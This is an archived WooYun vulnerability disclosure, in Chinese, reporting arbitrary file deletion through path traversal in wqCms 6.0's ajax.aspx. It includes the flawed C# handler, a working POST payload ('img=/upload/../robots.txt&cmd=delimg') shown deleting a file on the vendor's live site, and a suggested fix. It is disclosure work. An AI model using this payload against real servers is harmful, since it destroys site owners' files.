{"id": 54174, "wybug_id": "wooyun-2014-065309", "wybug_title": "wqCms6.0 任意文件删除", "wybug_corp": "wangqi.com", "wybug_author": "what_news", "wybug_date": "2014-06-26 10:51", "wybug_open_date": "2014-09-21 10:52", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件删除"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向公众公开  简要描述： 网奇最新版 存在任意文件删除访问<code>http://cms.wangqi.com/ajax.aspx</code> 详细说明：  ajax.aspx\nhttp://cms.wangqi.com/ajax.aspx\n源码如下\npublic void Page_Load(object sender, EventArgs e){    switch (base.Request.Form[\"cmd\"])    {        case \"newsVars\":            this.method_18();            return;        case \"userJson\":            this.method_19();            return;        case \"digg\":            this.method_20();            return;        case \"login\":            this.method_21(false);            return;        case \"loginAdm\":            this.method_21(true);            return;        case \"titleDuplicate\":            this.method_16();            return;        case \"selSort\":            this.method_22();            return;        case \"msgRecent\":            this.method_25();            return;        case \"msgFriends\":            this.method_26();            return;        case \"msgGet\":            this.method_27();            return;        case \"msgPost\":            this.method_28();            return;        case \"friendAdd\":            this.method_23();            return;        case \"friendRemove\":            this.method_24();            return;        case \"usernameValid\":            this.method_17();            return;        case \"serverSet\":            this.method_15();            return;        case \"delimg\":            this.method_14(); //跟进            return;.......\n\nprivate void method_14(){    if ((!string.IsNullOrEmpty(base.Request.Form[\"img\"]) && (base.Request.Form[\"img\"].ToLower().IndexOf(\"/upload/\") > -1)) && File.Exists(base.Server.MapPath(base.Request.Form[\"img\"])))    {        File.Delete(base.Server.MapPath(base.Request.Form[\"img\"])); //没处理..可跳出这个目录对任意文件进行删除了    }    if (!string.IsNullOrEmpty(base.Request.Form[\"imgID\"]) && (Convert.ToInt32(base.Request.Form[\"imgID\"]) > 0))    {        base.dbHelper.ExecuteNonQuery(CommandType.Text, \"delete from wqcms_imgList where imgID=\" + Convert.ToInt32(base.Request.Form[\"imgID\"]), new IDataParameter[0]);    }}\n   漏洞证明：  为了证明可以任意删除文件 我先访问下面的文件 是存在的\nhttp://cms.wangqi.com/robots.txt\n\n\n好的现在把这个文件删除了访问\nhttp://cms.wangqi.com/ajax.aspx\n提交\nimg=/upload/../robots.txt&cmd=delimg\n\n\n然后在访问\nhttp://cms.wangqi.com/robots.txt\n\n\n删除了 同样可以删除任意文件   修复方案：  过滤 .. 防止跳出upload目录   版权声明：转载请注明来源 what_news@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-21 10:52 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}